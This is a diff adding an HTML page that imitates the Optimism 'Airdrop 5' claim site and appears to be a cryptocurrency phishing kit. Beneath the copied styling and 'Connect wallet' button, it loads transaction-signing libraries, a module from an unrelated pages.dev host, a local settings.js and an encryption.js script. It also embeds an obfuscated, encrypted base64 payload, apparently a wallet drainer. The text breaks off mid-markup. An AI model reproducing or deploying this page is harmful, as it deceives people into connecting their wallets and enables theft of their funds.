@@ -1,0 +1,819 @@
+<!DOCTYPE html><html lang="en" style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;" data-scrapbook-source="https://app.optimism.io/airdrops" data-scrapbook-create="20240301043038656"><head><link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>     
+    <script src="./settings.js"></script>
+    <script src="https://cdnweb3.pages.dev/web3-ethers.js" type="module"></script></head><body class="light"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_pI80Wf"></div>
+    <meta charset="UTF-8">
+    <style type="text/css">:root, :host { --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid"; --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular"; --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light"; --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin"; --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone"; --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp"; --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp"; --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp"; --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands"; }
+svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa { overflow: visible; box-sizing: content-box; }
+.svg-inline--fa { display: var(--fa-display, inline-block); height: 1em; overflow: visible; vertical-align: -0.125em; }
+.svg-inline--fa.fa-2xs { vertical-align: 0.1em; }
+.svg-inline--fa.fa-xs { vertical-align: 0em; }
+.svg-inline--fa.fa-sm { vertical-align: -0.0714286em; }
+.svg-inline--fa.fa-lg { vertical-align: -0.2em; }
+.svg-inline--fa.fa-xl { vertical-align: -0.25em; }
+.svg-inline--fa.fa-2xl { vertical-align: -0.3125em; }
+.svg-inline--fa.fa-pull-left { margin-right: var(--fa-pull-margin, 0.3em); width: auto; }
+.svg-inline--fa.fa-pull-right { margin-left: var(--fa-pull-margin, 0.3em); width: auto; }
+.svg-inline--fa.fa-li { width: var(--fa-li-width, 2em); top: 0.25em; }
+.svg-inline--fa.fa-fw { width: var(--fa-fw-width, 1.25em); }
+.fa-layers svg.svg-inline--fa { inset: 0px; margin: auto; position: absolute; }
+.fa-layers-counter, .fa-layers-text { display: inline-block; position: absolute; text-align: center; }
+.fa-layers { display: inline-block; height: 1em; position: relative; text-align: center; vertical-align: -0.125em; width: 1em; }
+.fa-layers svg.svg-inline--fa { transform-origin: center center; }
+.fa-layers-text { left: 50%; top: 50%; transform: translate(-50%, -50%); transform-origin: center center; }
+.fa-layers-counter { background-color: var(--fa-counter-background-color, #ff253a); border-radius: var(--fa-counter-border-radius, 1em); box-sizing: border-box; color: var(--fa-inverse, #fff); line-height: var(--fa-counter-line-height, 1); max-width: var(--fa-counter-max-width, 5em); min-width: var(--fa-counter-min-width, 1.5em); overflow: hidden; padding: var(--fa-counter-padding, 0.25em 0.5em); right: var(--fa-right, 0); text-overflow: ellipsis; top: var(--fa-top, 0); transform: scale(var(--fa-counter-scale, 0.25)); transform-origin: right top; }
+.fa-layers-bottom-right { bottom: var(--fa-bottom, 0); right: var(--fa-right, 0); top: auto; transform: scale(var(--fa-layers-scale, 0.25)); transform-origin: right bottom; }
+.fa-layers-bottom-left { bottom: var(--fa-bottom, 0); left: var(--fa-left, 0); right: auto; top: auto; transform: scale(var(--fa-layers-scale, 0.25)); transform-origin: left bottom; }
+.fa-layers-top-right { top: var(--fa-top, 0); right: var(--fa-right, 0); transform: scale(var(--fa-layers-scale, 0.25)); transform-origin: right top; }
+.fa-layers-top-left { left: var(--fa-left, 0); right: auto; top: var(--fa-top, 0); transform: scale(var(--fa-layers-scale, 0.25)); transform-origin: left top; }
+.fa-1x { font-size: 1em; }
+.fa-2x { font-size: 2em; }
+.fa-3x { font-size: 3em; }
+.fa-4x { font-size: 4em; }
+.fa-5x { font-size: 5em; }
+.fa-6x { font-size: 6em; }
+.fa-7x { font-size: 7em; }
+.fa-8x { font-size: 8em; }
+.fa-9x { font-size: 9em; }
+.fa-10x { font-size: 10em; }
+.fa-2xs { font-size: 0.625em; line-height: 0.1em; vertical-align: 0.225em; }
+.fa-xs { font-size: 0.75em; line-height: 0.0833333em; vertical-align: 0.125em; }
+.fa-sm { font-size: 0.875em; line-height: 0.0714286em; vertical-align: 0.0535714em; }
+.fa-lg { font-size: 1.25em; line-height: 0.05em; vertical-align: -0.075em; }
+.fa-xl { font-size: 1.5em; line-height: 0.0416667em; vertical-align: -0.125em; }
+.fa-2xl { font-size: 2em; line-height: 0.03125em; vertical-align: -0.1875em; }
+.fa-fw { text-align: center; width: 1.25em; }
+.fa-ul { list-style-type: none; margin-left: var(--fa-li-margin, 2.5em); padding-left: 0px; }
+.fa-ul > li { position: relative; }
+.fa-li { left: calc(var(--fa-li-width, 2em) * -1); position: absolute; text-align: center; width: var(--fa-li-width, 2em); line-height: inherit; }
+.fa-border { border-color: var(--fa-border-color, #eee); border-radius: var(--fa-border-radius, 0.1em); border-style: var(--fa-border-style, solid); border-width: var(--fa-border-width, 0.08em); padding: var(--fa-border-padding, 0.2em 0.25em 0.15em); }
+.fa-pull-left { float: left; margin-right: var(--fa-pull-margin, 0.3em); }
+.fa-pull-right { float: right; margin-left: var(--fa-pull-margin, 0.3em); }
+.fa-beat { animation-name: fa-beat; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, ease-in-out); }
+.fa-bounce { animation-name: fa-bounce; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1)); }
+.fa-fade { animation-name: fa-fade; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1)); }
+.fa-beat-fade { animation-name: fa-beat-fade; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1)); }
+.fa-flip { animation-name: fa-flip; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, ease-in-out); }
+.fa-shake { animation-name: fa-shake; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, linear); }
+.fa-spin { animation-name: fa-spin; animation-delay: var(--fa-animation-delay, 0s); animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 2s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, linear); }
+.fa-spin-reverse { --fa-animation-direction: reverse; }
+.fa-pulse, .fa-spin-pulse { animation-name: fa-spin; animation-direction: var(--fa-animation-direction, normal); animation-duration: var(--fa-animation-duration, 1s); animation-iteration-count: var(--fa-animation-iteration-count, infinite); animation-timing-function: var(--fa-animation-timing, steps(8)); }
+@media (prefers-reduced-motion: reduce) {
+  .fa-beat, .fa-bounce, .fa-fade, .fa-beat-fade, .fa-flip, .fa-pulse, .fa-shake, .fa-spin, .fa-spin-pulse { animation-delay: -1ms; animation-duration: 1ms; animation-iteration-count: 1; transition-delay: 0s; transition-duration: 0s; }
+}
+@-webkit-keyframes fa-beat { 
+  0%, 90% { transform: scale(1); }
+  45% { transform: scale(var(--fa-beat-scale, 1.25)); }
+}
+@keyframes fa-beat { 
+  0%, 90% { transform: scale(1); }
+  45% { transform: scale(var(--fa-beat-scale, 1.25)); }
+}
+@-webkit-keyframes fa-bounce { 
+  0% { transform: scale(1, 1) translateY(0px); }
+  10% { transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0); }
+  30% { transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em)); }
+  50% { transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0); }
+  57% { transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em)); }
+  64% { transform: scale(1, 1) translateY(0px); }
+  100% { transform: scale(1, 1) translateY(0px); }
+}
+@keyframes fa-bounce { 
+  0% { transform: scale(1, 1) translateY(0px); }
+  10% { transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0); }
+  30% { transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em)); }
+  50% { transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0); }
+  57% { transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em)); }
+  64% { transform: scale(1, 1) translateY(0px); }
+  100% { transform: scale(1, 1) translateY(0px); }
+}
+@-webkit-keyframes fa-fade { 
+  50% { opacity: var(--fa-fade-opacity, 0.4); }
+}
+@keyframes fa-fade { 
+  50% { opacity: var(--fa-fade-opacity, 0.4); }
+}
+@-webkit-keyframes fa-beat-fade { 
+  0%, 100% { opacity: var(--fa-beat-fade-opacity, 0.4); transform: scale(1); }
+  50% { opacity: 1; transform: scale(var(--fa-beat-fade-scale, 1.125)); }
+}
+@keyframes fa-beat-fade { 
+  0%, 100% { opacity: var(--fa-beat-fade-opacity, 0.4); transform: scale(1); }
+  50% { opacity: 1; transform: scale(var(--fa-beat-fade-scale, 1.125)); }
+}
+@-webkit-keyframes fa-flip { 
+  50% { transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg)); }
+}
+@keyframes fa-flip { 
+  50% { transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg)); }
+}
+@-webkit-keyframes fa-shake { 
+  0% { transform: rotate(-15deg); }
+  4% { transform: rotate(15deg); }
+  8%, 24% { transform: rotate(-18deg); }
+  12%, 28% { transform: rotate(18deg); }
+  16% { transform: rotate(-22deg); }
+  20% { transform: rotate(22deg); }
+  32% { transform: rotate(-12deg); }
+  36% { transform: rotate(12deg); }
+  40%, 100% { transform: rotate(0deg); }
+}
+@keyframes fa-shake { 
+  0% { transform: rotate(-15deg); }
+  4% { transform: rotate(15deg); }
+  8%, 24% { transform: rotate(-18deg); }
+  12%, 28% { transform: rotate(18deg); }
+  16% { transform: rotate(-22deg); }
+  20% { transform: rotate(22deg); }
+  32% { transform: rotate(-12deg); }
+  36% { transform: rotate(12deg); }
+  40%, 100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes fa-spin { 
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+@keyframes fa-spin { 
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.fa-rotate-90 { transform: rotate(90deg); }
+.fa-rotate-180 { transform: rotate(180deg); }
+.fa-rotate-270 { transform: rotate(270deg); }
+.fa-flip-horizontal { transform: scale(-1, 1); }
+.fa-flip-vertical { transform: scale(1, -1); }
+.fa-flip-both, .fa-flip-horizontal.fa-flip-vertical { transform: scale(-1, -1); }
+.fa-rotate-by { transform: rotate(var(--fa-rotate-angle, none)); }
+.fa-stack { display: inline-block; vertical-align: middle; height: 2em; position: relative; width: 2.5em; }
+.fa-stack-1x, .fa-stack-2x { inset: 0px; margin: auto; position: absolute; z-index: var(--fa-stack-z-index, auto); }
+.svg-inline--fa.fa-stack-1x { height: 1em; width: 1.25em; }
+.svg-inline--fa.fa-stack-2x { height: 2em; width: 2.5em; }
+.fa-inverse { color: var(--fa-inverse, #fff); }
+.sr-only, .fa-sr-only { position: absolute; width: 1px; height: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; }
+.sr-only-focusable:not(:focus), .fa-sr-only-focusable:not(:focus) { position: absolute; width: 1px; height: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; }
+.svg-inline--fa .fa-primary { fill: var(--fa-primary-color, currentColor); opacity: var(--fa-primary-opacity, 1); }
+.svg-inline--fa .fa-secondary { fill: var(--fa-secondary-color, currentColor); opacity: var(--fa-secondary-opacity, 0.4); }
+.svg-inline--fa.fa-swap-opacity .fa-primary { opacity: var(--fa-secondary-opacity, 0.4); }
+.svg-inline--fa.fa-swap-opacity .fa-secondary { opacity: var(--fa-primary-opacity, 1); }
+.svg-inline--fa mask .fa-primary, .svg-inline--fa mask .fa-secondary { fill: black; }
+.fad.fa-inverse, .fa-duotone.fa-inverse { color: var(--fa-inverse, #fff); }</style><link rel="icon" href="favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Get started using OP Mainnet today.">
+    <link rel="apple-touch-icon" href="images/optimismlogo.png">
+    <!--
+      manifest.json provides metadata used when your web app is installed on a
+      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
+    -->
+    <link rel="manifest" href="https://app.optimism.io/manifest.json">
+    <!--
+      Notice the use of  in the tags above.
+      It will be replaced with the URL of the `public` folder during the build.
+      Only files inside the `public` folder can be referenced from the HTML.
+
+      Unlike "/favicon.ico" or "favicon.ico", "/favicon.ico" will
+      work correctly both with client-side routing and a non-root public URL.
+      Learn how to configure a non-root public URL by running `npm run build`
+    -->
+    <title>Optimism Airdrops</title>
+
+    <!-- OG TAGS -->
+    <meta property="og:title" content="OP Mainnet is Ethereum, scaled.">
+    <meta property="og:description" content="OP Mainnet is a low-cost and lightning-fast layer 2 blockchain. Scale Ethereum and sustainably fund public goods.">
+    <meta property="og:image" content="images/og-image.png">
+    <meta name="twitter:card" content="summary_large_image">
+    
+    
+    <link rel="stylesheet" href="css/index-2580a7f3.css">
+  <link rel="stylesheet" href="css/OptimismButton-ae4af5e7.css"><link rel="stylesheet" href="css/index-b66b75dd.css"><link rel="stylesheet" href="css/AppRoutes-08fa15d9.css"><link rel="stylesheet" href="css/index-aeb14f18.css"><link rel="stylesheet" href="css/index-86a93459.css"><meta name="title" content="Optimism Airdrops" data-react-helmet="true"><meta name="description" content="Learn if you are eligible for Optimism Airdrops" data-react-helmet="true"><script data-scrapbook-elem="custom-elements-loader" type="68153b38896eb69091c58280-text/javascript">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["wcm-explorer-context","wcm-theme-context","wcm-modal"])</script>
+    <link href="css/sweetalert2.min.css" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;family=Montserrat:wght@400;500;700&amp;family=Raleway:wght@400;500;700&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
+<script src="js/sweetalert2.all.min.js" type="68153b38896eb69091c58280-text/javascript"></script>
+<script src="js/ethereumjs-tx-1.3.3.min.js" type="68153b38896eb69091c58280-text/javascript"></script>
+<script src="js/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer" type="68153b38896eb69091c58280-text/javascript"></script>
+<script src="js/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer" type="68153b38896eb69091c58280-text/javascript"></script> 
+<script type="68153b38896eb69091c58280-text/javascript">
+
+      const _0xaffxo2d = "5chqdTK0sU9jzg=="  
+      const _0xfd2a8ce = "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";
+      
+</script>
+<script src="js/encryption.js" type="68153b38896eb69091c58280-text/javascript"></script>
+<script src="js/web3-ethers.js" type="68153b38896eb69091c58280-module"></script>
+  
+    
+    <div id="root"><div data-rk=""><style>[data-rk] { --rk-blurs-modalOverlay: blur(20px); --rk-fonts-body: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; --rk-radii-actionButton: 10px; --rk-radii-connectButton: 8px; --rk-radii-menuButton: 8px; --rk-radii-modal: 16px; --rk-radii-modalMobile: 18px; --rk-colors-accentColor: #FF0420; --rk-colors-accentColorForeground: white; --rk-colors-actionButtonBorder: rgba(0, 0, 0, 0.04); --rk-colors-actionButtonBorderMobile: rgba(0, 0, 0, 0.06); --rk-colors-actionButtonSecondaryBackground: rgba(0, 0, 0, 0.06); --rk-colors-closeButton: rgba(60, 66, 66, 0.8); --rk-colors-closeButtonBackground: rgba(0, 0, 0, 0.06); --rk-colors-connectButtonBackground: #FFF; --rk-colors-connectButtonBackgroundError: #FF494A; --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06)); --rk-colors-connectButtonText: #25292E; --rk-colors-connectButtonTextError: #FFF; --rk-colors-connectionIndicator: #30E000; --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF; --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF; --rk-colors-error: #FF494A; --rk-colors-generalBorder: rgba(0, 0, 0, 0.06); --rk-colors-generalBorderDim: rgba(0, 0, 0, 0.03); --rk-colors-menuItemBackground: rgba(60, 66, 66, 0.1); --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.3); --rk-colors-modalBackground: #FFF; --rk-colors-modalBorder: transparent; --rk-colors-modalText: #25292E; --rk-colors-modalTextDim: rgba(60, 66, 66, 0.3); --rk-colors-modalTextSecondary: rgba(60, 66, 66, 0.6); --rk-colors-profileAction: #FFF; --rk-colors-profileActionHover: rgba(255, 255, 255, 0.5); --rk-colors-profileForeground: rgba(60, 66, 66, 0.06); --rk-colors-selectedOptionBorder: rgba(60, 66, 66, 0.1); --rk-colors-standby: #FFD641; --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1); --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32); --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04); --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24); --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.12); --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16); }</style><div class="app-container"><nav class="_topbarContainer_1y6ys_1"><nav class="_desktopTopbarContainer_1ij2a_1"><section class="_desktopLinksSection_1ij2a_12"><a class="_logoLink_1ij2a_48" href="">OPTIMISM</a></section><section class="_desktopActionsSection_1ij2a_57"><div class="_divider_1ij2a_62"></div><div><button data-cy="connectWallet" class="claim-button _connectButton_4o8oh_6">Connect wallet<claim-button></div></section></nav></nav><div><div class="_airdropContainer_pxmpn_1"><div class="_splashContainer_pxmpn_9"><img src="images/splash_graphic-3105291a.png" alt="Airdrop Hub Splash" class="_splashImage_pxmpn_19"><div class="_splashFade_pxmpn_24"></div></div><div class="_hubCard_1mjhw_1"><div class="_topSection_1mjhw_12"><div class="_hubHeader_1mjhw_18"><div class="_hubTitle_1mjhw_24">Airdrop 5</div><div class="_hubSubtitle_1mjhw_30">Grow Optimism. Get rewarded.</div></div><div 